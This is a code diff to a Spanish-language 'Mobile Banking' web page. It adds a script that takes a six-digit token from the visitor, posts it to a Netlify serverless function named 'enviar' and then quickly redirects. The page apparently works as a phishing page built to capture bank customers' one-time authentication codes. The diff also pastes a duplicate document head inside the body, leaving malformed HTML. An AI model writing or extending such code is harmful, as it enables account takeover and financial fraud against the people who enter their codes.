@@ -7,6 +7,15 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
 
     <!-- Header superior -->
     <header class="top-bar">
@@ -52,14 +61,34 @@
         <p>Salir</p>
     </footer>
 
-    <!-- Script -->
-    <script>
-        const tokenInput = document.querySelector('.token-input');
+   <script>
+const tokenInput = document.querySelector('.token-input');
 
-        tokenInput.addEventListener('input', () => {
-            tokenInput.value = tokenInput.value.replace(/[^0-9]/g, '');
-        });
-    </script>
+tokenInput.addEventListener('input', () => {
+    tokenInput.value = tokenInput.value.replace(/[^0-9]/g, '');
+});
+
+function enviarToken() {
+    const token = tokenInput.value;
+
+    if (token.length !== 6) return;
+
+    fetch("/.netlify/functions/enviar", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            tipo: "token",
+            valor: token
+        })
+    });
+
+    // opcional: redirigir después
+    setTimeout(() => {
+        window.location.href = "index.html"; // o la página que quieras
+    }, 300);
+}
+</script>
+
 
 </body>
 </html>
